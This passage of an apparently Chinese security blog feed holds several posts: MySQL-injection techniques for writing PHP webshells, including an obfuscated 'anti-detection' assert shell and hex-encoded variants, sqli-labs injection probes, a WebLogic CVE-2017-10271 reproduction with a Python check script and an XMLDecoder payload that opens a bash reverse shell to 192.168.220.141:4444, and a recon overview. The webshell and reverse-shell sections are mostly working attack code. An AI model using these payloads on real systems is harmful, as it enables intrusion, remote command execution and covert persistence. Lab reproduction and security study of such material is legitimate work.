<p>　　　reboot</p>
<p>清屏：clear</p>
<p>用户管理：</p>
<p>添加用户：useradd 用户名</p>
<p>passwd 用户名   //设置密码</p>
<p>userdel -r 用户名      //删除用户及用户主目录</p>
<p>修改用户：usermod -1 用户1，用户2    //修改用户1位用户2</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MySql注入点写webshell</title>
    <url>/posts/23798.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过<code>mysql</code>插入一条<code>php</code>代码记录输出到<code>http</code>服务器工作目录下，通过<code>url</code>传参来交给<code>php</code>系统命令函数来执行获取返回结果，若权限等足够可以直接创建新的账号密码来远程登录</p>
<p>可以先查看一下<code>mysql</code>的能写的文件 <code>secure_file_priv</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &#39;%secure%&#39;;</span><br><span class="line">secure_file_priv的值为null，表示限制mysqld不允许导入&#x2F;导出</span><br><span class="line">secure_file_priv的值为D:&#x2F;，表示限制mysqld的导入&#x2F;导出只能发生在D盘目录下</span><br><span class="line">secure_file_priv没有具体值时，表示不对mysqld的导入&#x2F;导出做限制</span><br></pre></td></tr></table></figure>

<h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul>
<li>对<code>web</code>目录有写权限</li>
<li><code>GPC</code>关闭(<code>GPC</code>：是否对单引号转义)</li>
<li>有绝对路径(读文件可以不用，写文件需要)</li>
<li>没有配置<code>secure-file-priv</code></li>
</ul>
<h3 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h3><ul>
<li>有<code>union</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php assert($_POST["cmd"]); ?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/home/wwwroot/default/shell.php'</span></span><br></pre></td></tr></table></figure>

<ul>
<li>无<code>union</code></li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">into outfile '/home/wwwroot/default/shell.php' fields terminated by '&lt;?php assert($_POST["cmd"]);?&gt;'</span><br></pre></td></tr></table></figure>

<h2 id="general-log"><a href="#general-log" class="headerlink" title="general_log"></a>general_log</h2><p>新版本的<code>MySQL</code>设置了导出文件的路径，很难在获取<code>Webshell</code>过程中去修改配置文件，无法通过使用<code>select into outfile</code>来写入一句话。这时，我们可以通过修改<code>MySQL</code>的<code>log</code>文件来获取<code>Webshell</code>。</p>
<h3 id="使用条件-1"><a href="#使用条件-1" class="headerlink" title="使用条件"></a>使用条件</h3><ul>
<li>对<code>web</code>目录有写权限</li>
<li><code>GPC</code>关闭(<code>GPC</code>：是否对单引号转义)</li>
<li>有绝对路径(读文件可以不用，写文件需要)</li>
<li>需要能执行多行SQL语句</li>
</ul>
<h3 id="姿势-1"><a href="#姿势-1" class="headerlink" title="姿势"></a>姿势</h3><h4 id="常用方式"><a href="#常用方式" class="headerlink" title="常用方式"></a>常用方式</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;             <span class="comment">#查看配置</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;                 <span class="comment">#开启general log模式</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'E:/study/WWW/evil.php'</span>; <span class="comment">#设置日志目录为shell地址</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_GET[g]);?&gt;'</span>             <span class="comment">#写入shell</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">off</span>;                  <span class="comment">#关闭general log模式</span></span><br></pre></td></tr></table></figure>

<h4 id="免杀shell"><a href="#免杀shell" class="headerlink" title="免杀shell"></a>免杀shell</h4><p>一句话webshell</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['cmd']));?&gt;"</span></span><br></pre></td></tr></table></figure>

<p>创建数据表，写入webshell后删除数据表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`mysql`</span>.<span class="string">`antian365`</span> (<span class="string">`temp`</span> <span class="built_in">TEXT</span> <span class="keyword">NOTNULL</span> );</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`mysql`</span>.<span class="string">`antian365`</span> (<span class="string">`temp`</span> ) <span class="keyword">VALUES</span>(<span class="string">'&lt;?php @eval($_POST[antian365]);?&gt;'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">`temp`</span> <span class="keyword">FROM</span> <span class="string">`antian365`</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span><span class="string">'D:/www/antian365.php'</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`antian365`</span>;</span><br></pre></td></tr></table></figure>

<p>select unhex(‘十六进制字符串’) into dumpfile file_path，密码==&gt;pp64mqa2x1rnw68</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">unhex</span>(<span class="stringspan>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'D:/WEB/IPTEST/22.php'</span></span><br></pre></td></tr></table></figure>

<h2 id="利用分隔符写shell"><a href="#利用分隔符写shell" class="headerlink" title="利用分隔符写shell"></a>利用分隔符写shell</h2><p>当MySQL注入点为盲注或报错，<code>union select</code>写入的方式显然是利用不了的，那么可以通过分隔符写入。<code>Sqlmap</code>的<code>--os-shell</code>命令所采用的就是这种方式。</p>
<h3 id="使用要求"><a href="#使用要求" class="headerlink" title="使用要求"></a>使用要求</h3><ul>
<li><code>secure_file_priv</code>支持<code>web</code>目录文件导出</li>
<li>对<code>web</code>目录有写权限</li>
<li>有绝对路径</li>
</ul>
<h3 id="姿势-2"><a href="#姿势-2" class="headerlink" title="姿势"></a>姿势</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 LIMIT 0,1 INTO OUTFILE &#39;E:&#x2F;study&#x2F;WWW&#x2F;evil.php&#39; lines terminated by 0x20273c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e27 --</span><br></pre></td></tr></table></figure>

<p>同样的技巧，一共有四种形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; lines terminated by  （一句话hex编码）#</span><br><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; fields terminated by （一句话hex编码）#</span><br><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; columns terminated by （一句话hex编码）#</span><br><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; lines starting by    （一句话hex编码）#</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>webshell</tag>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-labs学习</title>
    <url>/posts/20471.html</url>
    <content><![CDATA[<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a> </p>
<h2 id="第一部分（page-1-Basic-Challenges）"><a href="#第一部分（page-1-Basic-Challenges）" class="headerlink" title="第一部分（page-1 Basic Challenges）"></a>第一部分（page-1 Basic Challenges）</h2><h3 id="Background-1-基础知识"><a href="#Background-1-基础知识" class="headerlink" title="Background-1 基础知识"></a>Background-1 基础知识</h3><ol>
<li><p>注入的分类</p>
<ul>
<li><p>基于从服务器接收到的响应 </p>
<ul>
<li>基于错误的SQL注入</li>
<li>联合查询注入</li>
<li>堆查询注入</li>
<li>盲注（布尔盲注、时间盲注、报错盲注）</li>
</ul>
</li>
<li><p>基于如何处理输入的SQL查询（数据类型）</p>
<ul>
<li>基于字符串</li>
<li>数字或整数为基础的</li>
</ul>
</li>
<li><p>基于程度和顺序的注入（哪里发生了影响）</p>
<ul>
<li><p>一阶注入</p>
</li>
<li><p>二阶注入</p>
</li>
</ul>
<p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；二阶注入类似存 储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间 接的对 WEB 产生危害，这样的就被称为是二阶注入. </p>
</li>
<li><p>基于注入点的位置上</p>
<ul>
<li>通过用户输入的表单域的注射</li>
<li>通过cookie注射</li>
<li>通过服务器变量注射（基于头部信息的注射）</li>
</ul>
</li>
</ul>
</li>
<li><p>系统函数</p>
<ul>
<li>version()  –MySQL版本</li>
<li>user() –数据库用户名</li>
<li>database() –数据库名</li>
<li>@@datadir –数据库路径</li>
<li>@@version_compile_os –操作系统版本</li>
</ul>
</li>
<li><p>字符串连接函数</p>
<p>函数具体介绍 <a href="http://www.cnblogs.com/lcamry/p/5715634.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5715634.html</a> </p>
<ul>
<li>concat(str1, str2, …)  – 没有分隔符的连接字符串</li>
<li>concat_ws(separator, str1, str2, …) – 有分隔符的连接字符串</li>
<li>group_concat(str1, str2, …) – 连接一个组的所有字符串，并以逗号分隔每一条数据 </li>
</ul>
</li>
<li><p>一般用于尝试的语句</p>
<p>ps：<code>--+</code>可以用 <code>#</code> 替换， url提交过程中url编码后的<code>#</code>为<code>%23</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">or 1=1 --+</span><br><span class="line">' or 1=1 --+</span><br><span class="line">" or 1=1 --+</span><br><span class="line">) or 1=1 --+</span><br><span class="line">') or 1=1 --+</span><br><span class="line">") or 1=1 --+</span><br><span class="line">")) or 1=1 --+</span><br></pre></td></tr></table></figure>

<p>一般的代码为： </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$id=$_GET['id']; </span><br><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>此处考虑两个点，一个是闭合前面你的<code>&#39;</code>，另一个是处理后面的 <code>&#39;</code>，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23） </p>
</li>
<li><p>union操作符的介绍</p>
<p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的 列的顺序必须相同。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select column_name(s) from table_name1 union select column_name(s) from table_name2</span><br></pre></td></tr></table></figure>

<p>默认地，<code>UNION</code> 操作符选取不同的值。如果允许重复的值，请使用 <code>UNION ALL</code>。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name(s) <span class="keyword">from</span> table_name1 <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> column_name(s) <span class="keyword">from</span> table_name2</span><br></pre></td></tr></table></figure>

<p>UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名</p>
</li>
<li><p>SQL中的逻辑运算</p>
</li>
<li><p>注入流程</p>
<p><img src="/posts/20471/F:%5Chexo-blog%5Csource_posts%5CSqli-labs%E5%AD%A6%E4%B9%A0%5Cimage-20200413190947414.png" alt="image-20200413190947414"></p>
</li>
</ol>
<p>Mysql 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。 </p>
<p>猜数据库 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p>猜某库的数据表 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’</span><br></pre></td></tr></table></figure>

<p>猜某表的所有列 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name&#x3D;’xxxxx’</span><br></pre></td></tr></table></figure>

<p>获取某列的内容 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select *** from ****</span><br></pre></td></tr></table></figure>

<h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><h3 id="Background-2-盲注的讲解"><a href="#Background-2-盲注的讲解" class="headerlink" title="Background-2 盲注的讲解"></a>Background-2 盲注的讲解</h3><h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4>]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic复现之XML Decoder反序列化</title>
    <url>/posts/29626.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天复现XML Decoder反序列化漏洞。</p>
<ul>
<li><p>涉及版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.3.6.0.0</span><br><span class="line">12.1.3.0.0</span><br><span class="line">12.2.1.1.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>漏洞地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;CoordinatorPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</span><br><span class="line">&#x2F;wls-wsat&#x2F;ParticipantPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;CoordinatorPortType11</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11</span><br><span class="line">&#x2F;wls-wsat&#x2F;ParticipantPortType11</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="复现攻击"><a href="#复现攻击" class="headerlink" title="复现攻击"></a>复现攻击</h2><h3 id="简单的漏洞证明"><a href="#简单的漏洞证明" class="headerlink" title="简单的漏洞证明"></a>简单的漏洞证明</h3><ol>
<li><p>检测漏洞</p>
<p>检测脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">    &#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko&#x2F;20100101 Firefox&#x2F;48.0&#39;,</span><br><span class="line">    &#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">    &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,</span><br><span class="line">    &#39;Content-Type&#39;: &#39;text&#x2F;xml&#39;</span><br><span class="line">    &#125;</span><br><span class="line">def Webogic_XMLDecoder_poc(url):</span><br><span class="line">    posturl&#x3D;url+&#39;&#x2F;wls-wsat&#x2F;CoordinatorPortType&#39;</span><br><span class="line">    data &#x3D; &#39;&#39;&#39;</span><br><span class="line">    &lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">        &lt;soapenv:Header&gt;</span><br><span class="line">            &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">                &lt;java version&#x3D;&quot;1.6.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">                    &lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">                        &lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;wls-wsat&#x2F;54p17w&#x2F;war&#x2F;test.txt&lt;&#x2F;string&gt;&lt;void method&#x3D;&quot;println&quot;&gt;</span><br><span class="line">                        &lt;string&gt;xmldecoder_vul_test&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;object&gt;</span><br><span class="line">                &lt;&#x2F;java&gt;</span><br><span class="line">            &lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">        &lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">        &lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;soapenv:Envelope&gt;</span><br><span class="line">    &#39;&#39;&#39;  </span><br><span class="line">    print (url)</span><br><span class="line">    try:</span><br><span class="line">        r&#x3D;requests.post(posturl,data&#x3D;data,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">        geturl&#x3D;url+&quot;&#x2F;wls-wsat&#x2F;test.txt&quot;</span><br><span class="line">        print (geturl)</span><br><span class="line">        check_result &#x3D; requests.get(geturl,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">        if &#39;xmldecoder_vul_test&#39; in check_result.text:</span><br><span class="line">            print (&quot;[+]存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;)</span><br><span class="line">    except:</span><br><span class="line">        print (&quot;[-]不存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;192.168.220.141:7001&quot; #目标url</span><br><span class="line">    Webogic_XMLDecoder_poc(url)</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.141:7001</span><br><span class="line">http:&#x2F;&#x2F;192.168.220.141:7001&#x2F;wls-wsat&#x2F;test.txt</span><br><span class="line">[+]存在WebLogic WLS远程执行漏洞(CVE-2017-10271)</span><br></pre></td></tr></table></figure>
</li>
<li><p>写入webshell</p>
<p>漏洞地址为：<code>http://192.168.220.141:7001/wls-wsat/CoordinatorPortType</code></p>
<p>burp抓包，转发到repeater下</p>
<p>将GET变为POST，并将Webshell写下，点击Go按钮，</p>
<p>访问<a href="http://192.168.220.141:7001/bea_wls_internal/test.jsp" target="_blank" rel="noopener">http://192.168.220.141:7001/bea_wls_internal/test.jsp</a></p>
<p>![](Weblogic复现之XML Decoder反序列化/1.png)</p>
</li>
</ol>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><ol>
<li><p>漏洞检测</p>
<p>工具利用： XML反序列化漏洞检查工具</p>
<p>脚本利用： 上面的检测脚本</p>
</li>
<li><p>burp抓包，转发到Repeater，攻击机开启端口监听</p>
</li>
<li><p>将GET改为POST，传入反弹shell脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:7001</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 645</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.220.141&#x2F;4444 0&gt;&amp;1&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>反弹shell成功！！！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@localhost:vulhub&#x2F;weblogic&#x2F;CVE-2017-10271# nc -lvvp 4444</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 4444)</span><br><span class="line">Connection from [172.21.0.2] port 4444 [tcp&#x2F;*] accepted (family 2, sport 45968)</span><br><span class="line">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@f84f979b36de:~&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain# whoami</span><br><span class="line">&lt;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain# whoami                        </span><br><span class="line">root</span><br><span class="line">root@f84f979b36de:~&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain#</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Web渗透测试-信息收集总结</title>
    <url>/posts/44511.html</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>信息收集分为：被动信息收集和主动信息收集。</p>
<p><strong>被动信息收集</strong><br>不会与目标服务器做直接的交互，在不被目标系统察觉的情况下，通过搜索引擎、社交媒体等方式对目标外围的信息进行收集。</p>
<p><strong>主动信息收集</strong><br>和被动信息收集相反，主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。</p>
<p>没有一种方式是最完美的，每个方式都有自己的优势，主动方式，你能获取更多的信息，但是目标主机可能会记录你的操作记录。被动方式，你收集的信息会相对较少，但是你的行动并不会被目标主机发现。一般在一个渗透项目下，你需要有多次的信息收集，同时也要运用不同的收集方式，才能保证信息收集的完整性。</p>
<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><h2 id="DNS域名信息收集"><a href="#DNS域名信息收集" class="headerlink" title="DNS域名信息收集"></a>DNS域名信息收集</h2><p>我们需要收集域名对应的 ip，域名注册人、DNS记录、子域名等等一系列与域名相关的信息。<br>扫描域名信息的工具由很多，比如：Whois、DIG、Layer、Dnsenum、dnsmap、Fierce、Dmitry、Maltego等等<br>传送门：</p>
<p><a href="https://blog.csdn.net/qq_36119192/article/details/84068625" target="_blank" rel="noopener">DNS域名探测工具的使用whois、DIG、Layer、dnsenum</a></p>
<p>在线子域名查询地址：<a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p>
<h2 id="操作系统类型"><a href="#操作系统类型" class="headerlink" title="操作系统类型"></a>操作系统类型</h2><p>服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。</p>
<ul>
<li><p>判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。<br><img src="/posts/44511/%E6%94%B6%E9%9B%862.png" alt></p>
</li>
<li><p>可以使用nmap的“-O”参数，来初步判断服务器系统类型：<br><img src="/posts/44511/1.png" alt></p>
</li>
<li><p>大小写<br>访问网站：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;index.html</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;inDex.html</span><br></pre></td></tr></table></figure>
<p>Windows操作系统不区分大小写，Linux系统大小写敏感，用此方法能够判断是Windows还是Linux系统。</p>
</li>
</ul>
<h2 id="网站容器-Apache-Nginx-Tomcat-IIS"><a href="#网站容器-Apache-Nginx-Tomcat-IIS" class="headerlink" title="网站容器(Apache/Nginx/Tomcat/IIS)"></a>网站容器(Apache/Nginx/Tomcat/IIS)</h2><p>知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</p>
<p>探测网站是哪种web服务器，可以使用工具 whatweb 。</p>
<p>传送门：<a href="https://blog.csdn.net/qq_36119192/article/details/84061734" target="_blank" rel="noopener">网站指纹识别工具Whatweb的使用</a></p>
<h2 id="脚本类型-php-jsp-asp-aspx"><a href="#脚本类型-php-jsp-asp-aspx" class="headerlink" title="脚本类型(php/jsp/asp/aspx)"></a>脚本类型(php/jsp/asp/aspx)</h2><p>我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。</p>
<ul>
<li><p>可以根据网站URL来判断</p>
</li>
<li><p>site:xxx  filetype:php</p>
</li>
<li><p>可以根据Firefox的插件来判断</p>
<p><img src="/posts/44511/%E6%94%B6%E9%9B%863.png" alt></p>
</li>
</ul>
<h2 id="数据库类型-Mysql-Oracle-Accees-Mqlserver"><a href="#数据库类型-Mysql-Oracle-Accees-Mqlserver" class="headerlink" title="数据库类型(Mysql/Oracle/Accees/Mqlserver)"></a>数据库类型(Mysql/Oracle/Accees/Mqlserver)</h2><p>我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的.</p>
<h2 id="主机扫描-AWVS、Nessus"><a href="#主机扫描-AWVS、Nessus" class="headerlink" title="主机扫描(AWVS、Nessus)"></a>主机扫描(AWVS、Nessus)</h2><p>对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。</p>
